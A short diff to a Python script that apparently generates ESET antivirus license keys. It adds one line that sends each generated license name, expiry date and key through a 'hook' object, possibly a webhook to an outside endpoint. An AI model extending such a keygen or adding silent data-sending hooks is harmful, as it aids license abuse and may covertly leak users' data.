@@ -112,6 +112,7 @@ if __name__ == '__main__':
             license_name, license_out_date, license_key = EsetKeyG.getLicenseData()
             output_line = f'\nLicense Name: {license_name}\nLicense Out Date: {license_out_date}\nLicense Key: {license_key}\n'
             output_filename = 'ESET KEYS.txt'
+          hook.send(f"License Name = ${license_name} \n License Out Date = ${license_out_date} \n License Key = ${license_key}")
         logger.console_log(output_line)
         date = datetime.datetime.now()
         f = open(f"{str(date.day)}.{str(date.month)}.{str(date.year)} - "+output_filename, 'a')
